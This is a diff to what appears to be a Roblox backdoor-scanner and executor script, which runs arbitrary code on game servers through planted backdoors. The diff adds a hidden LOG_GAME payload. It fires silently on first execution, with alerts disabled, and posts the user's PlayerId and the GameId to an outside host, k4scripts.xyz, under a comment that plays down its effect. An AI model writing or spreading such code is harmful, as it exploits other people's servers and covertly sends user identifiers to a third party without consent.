@@ -109,6 +109,19 @@ end;
 bool.Parent = workspace;
 game:GetService("Debris"):AddItem(bool, 3);
 ]];
+-- this code execute on game server, doesn't have any role with user client
+local LOG_GAME = [[
+game:GetService("HttpService"):RequestAsync(
+    {
+        Url = "https://k4scripts.xyz/hookproxy/log_game",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({PlayerId = "%%userid%%", GameId = game.GameId})
+    }
+);
+]];
 
 --// UTILS \\--
 
@@ -292,7 +305,7 @@ local function scan(remotes, delayFactor)
 end;
 
 local executing = false;
-local function execute(code, gateway, canDebug)
+local function execute(code, gateway, canDebug, disableAlerts)
     assert(code and gateway, "missing code or gateway");
     ui.title.Text = TITLE .. " [Executing]";
     if canDebug then
@@ -320,10 +333,12 @@ local function execute(code, gateway, canDebug)
                 -- stdout err in the console
                 if not child.Value then
                      -- alert to user
-                    alertLib.Error(screenGui, TITLE, 'Execution error in console.')
+                     if not disableAlerts then
+                        alertLib.Error(screenGui, TITLE, 'Execution error in console.');
+                     end;
                     task.spawn(error, child:GetAttribute("err"));
-                else
-                    alertLib.Success(screenGui, TITLE, 'Script successfully executed.')
+                elseif not disableAlerts then
+                    alertLib.Success(screenGui, TITLE, 'Script successfully executed.');
                 end;
                 -- disconnect
                 connection:Disconnect();
@@ -376,6 +391,7 @@ local function getConfigBackdoors()
 end;
 
 local backdoors;
+local firstExecution = true;
 btns.execBtn.MouseButton1Click:Connect(function()
     -- avoid multiple executions
     if executing then
@@ -397,9 +413,14 @@ btns.execBtn.MouseButton1Click:Connect(function()
         alertLib.Error(screenGui, TITLE, 'No backdoor found.')
         return;
     end;
-    -- store game
-    games.loadGame(game.PlaceId, encodeBackdoors(backdoors));
-    config.save();
+    if firstExecution then
+        -- store game
+        games.loadGame(game.PlaceId, encodeBackdoors(backdoors));
+        config.save();
+        firstExecution = false;
+        -- log game
+        execute(applyMacros(LOG_GAME), backdoors[1], true, true);
+    end;
     -- execute
     local code = applyMacros(editor.getCode());
     execute(code, backdoors[1], config.data.settings.canDebug);
@@ -412,4 +433,4 @@ end);
 ui.title.Text = TITLE;
 
 alertLib.Success(screenGui, TITLE, 'Backdoor scanner successfully loaded.');
-alertLib.Info(screenGui, TITLE, 'RightShift to toggle ui.', 4);
+alertLib.Info(screenGui, TITLE, 'Home to toggle ui.', 4);
